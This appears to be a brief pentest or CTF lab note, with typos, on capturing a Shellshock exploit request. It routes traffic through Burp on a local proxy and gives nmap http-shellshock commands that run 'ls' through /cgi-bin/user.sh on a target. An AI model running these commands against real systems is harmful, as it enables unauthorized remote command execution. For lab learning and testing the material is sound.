**To caputer the shellshock request:**
1. In burp add a proxy 127.0.0.1:8081 and also set **Request Handling** to redrect the request to server
2. mofiy the nmap request 
	Nmap Original: `sudo nmap --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls $IP`
	Nmap Modified:`sudo nmap -sV -p8081 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 127.0.0.1`